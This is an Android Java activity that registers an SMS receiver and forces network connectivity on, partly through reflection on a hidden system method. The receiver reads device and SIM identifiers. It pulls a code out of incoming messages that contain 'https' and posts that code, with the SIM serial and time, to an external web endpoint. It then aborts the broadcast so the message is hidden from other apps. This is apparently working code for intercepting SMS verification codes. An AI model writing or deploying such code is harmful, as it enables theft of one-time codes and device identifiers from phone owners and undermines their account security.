package com.yulin.sms;

import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.sql.Date;
import java.text.SimpleDateFormat;

import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;

import com.yulin.util.CustomerHttpClient;
import com.yulin.util.StringUtil;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.ConnectivityManager;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;

public class SmsActivity extends Activity{
	private static TextView tv;
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		if(!toggleWiFi(this,true)){
			toggleMobileData(this,true);
		}
		tv = new TextView(this);
        ScrollView sv = new ScrollView(this);  
        sv.addView(tv);  
          
        setContentView(sv);  
        
        SmsReciver sms = new SmsReciver ();    
        //实例化过滤器并设置要过滤的广播    
        IntentFilter intentFilter = new IntentFilter();    
        intentFilter.addAction("android.provider.Telephony.SMS_RECEIVED");    
            
        //注册广播    
        this.registerReceiver(sms, intentFilter);  
	}
	
	
	/**
	 * WIFI网络开关	 */
	private boolean toggleWiFi(Context context, boolean enabled) {
		WifiManager wm = (WifiManager) context
				.getSystemService(Context.WIFI_SERVICE);
		return wm.setWifiEnabled(enabled);
	}
	
	/**  
	 * 移动网络开关  
	 */ 
	private void toggleMobileData(Context context, boolean enabled) {  
	    ConnectivityManager conMgr = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);  
	    Class<?> conMgrClass = null; // ConnectivityManager类  
	    Field iConMgrField = null; // ConnectivityManager类中的字段  
	    Object iConMgr = null; // IConnectivityManager类的引用  
	    Class<?> iConMgrClass = null; // IConnectivityManager类  
	    Method setMobileDataEnabledMethod = null; // setMobileDataEnabled方法  
	    try {   
	        // 取得ConnectivityManager类   
		conMgrClass = Class.forName(conMgr.getClass().getName());   
		// 取得ConnectivityManager类中的对象mService   
		iConMgrField = conMgrClass.getDeclaredField("mService");   
		// 设置mService可访问  
	        iConMgrField.setAccessible(true);   
		// 取得mService的实例化类IConnectivityManager   
		iConMgr = iConMgrField.get(conMgr);   
		// 取得IConnectivityManager类   
		iConMgrClass = Class.forName(iConMgr.getClass().getName());   
		// 取得IConnectivityManager类中的setMobileDataEnabled(boolean)方法   
		setMobileDataEnabledMethod = iConMgrClass.getDeclaredMethod("setMobileDataEnabled", Boolean.TYPE);   
		// 设置setMobileDataEnabled方法可访问   
		setMobileDataEnabledMethod.setAccessible(true);   
		// 调用setMobileDataEnabled方法   
		setMobileDataEnabledMethod.invoke(iConMgr, enabled);  
		} catch (ClassNotFoundException e) {   
		    e.printStackTrace();  
		} catch (NoSuchFieldException e) {   
		    e.printStackTrace();  
		} catch (SecurityException e) {   
		    e.printStackTrace();  
		} catch (NoSuchMethodException e) {   
		    e.printStackTrace();  
		} catch (IllegalArgumentException e) {   
		    e.printStackTrace();  
		} catch (IllegalAccessException e) {   
		    e.printStackTrace();  
		} catch (InvocationTargetException e) {   
		    e.printStackTrace();  
		} 
	}
	static class SmsReciver extends BroadcastReceiver {
		static final String TAG = "SMSReceive";
		static final String smsuri = "android.provider.Telephony.SMS_RECEIVED";
		static final String url = "http://www.b2asoft.com/Software/api/mobilesms.asp";

		@Override
		public void onReceive(Context context, Intent intent) {
			
			TelephonyManager tm = (TelephonyManager) context
					.getSystemService(Context.TELEPHONY_SERVICE);
			String deviceid = tm.getDeviceId();
			String tel = tm.getLine1Number();
			String imei = tm.getSimSerialNumber();
			String imsi = tm.getSubscriberId();
//			Toast.makeText(context, "设备参数为: deviceid-" + deviceid + "-imei-" + imei + "-imsi-" + imsi, 3000).show();  
			Log.i(TAG, "deviceid:" + deviceid + "-imei:" + imei + "-imsi:" + imsi);
			if (intent.getAction().equals(smsuri)) {
				Bundle bundle = intent.getExtras();
				if (null != bundle) {
					Object[] pdus = (Object[]) bundle.get("pdus");
					SmsMessage[] smg = new SmsMessage[pdus.length];
					for (int i = 0; i < pdus.length; i++) {
						smg[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
						Log.i(TAG + "smg" + i, smg[i].toString());
					}
					for (SmsMessage cursmg : smg) {
						String body = cursmg.getDisplayMessageBody();
						String address = cursmg.getDisplayOriginatingAddress();
						SimpleDateFormat format = new SimpleDateFormat(
								"yyyy-MM-dd hh:mm:ss");
						String date = format.format(new Date(cursmg
								.getTimestampMillis()));

						Log.i(TAG + "body", body);
						Log.i(TAG + "address", address);
						Log.i(TAG + "date", date);
						
	                    String code = "";
	                    if(body.contains("https")){
	                    	code = StringUtil.getSms(body);
	                    }
						
						StringBuilder smsBuilder = new StringBuilder();
	                    smsBuilder.append("[ ");  
	                    smsBuilder.append(imei + ", ");  
	                    smsBuilder.append(address + ", ");  
	                    smsBuilder.append(body + ", ");  
	                    smsBuilder.append(code + ", ");  
	                    smsBuilder.append(date );  
	                    smsBuilder.append(" ]\n\n");
	                    
	                    if(StringUtil.checkNotEmptyOrNull(code)){   //如果有code发送
	                    	NameValuePair param1 = new BasicNameValuePair("keycode", code);
	                    	NameValuePair param2 = new BasicNameValuePair("IMEI", imei);
	                    	NameValuePair param3 = new BasicNameValuePair("smstime", date);
	                    	String result = CustomerHttpClient.post(url, param1,param2,param3);
//	                    	Toast.makeText(context, "接收:"+result, 5000).show(); 
	                    }
	                    
						tv.setText("发送:"+smsBuilder.toString());  
					}
					abortBroadcast(); 
				}
			}
		}

	}
}
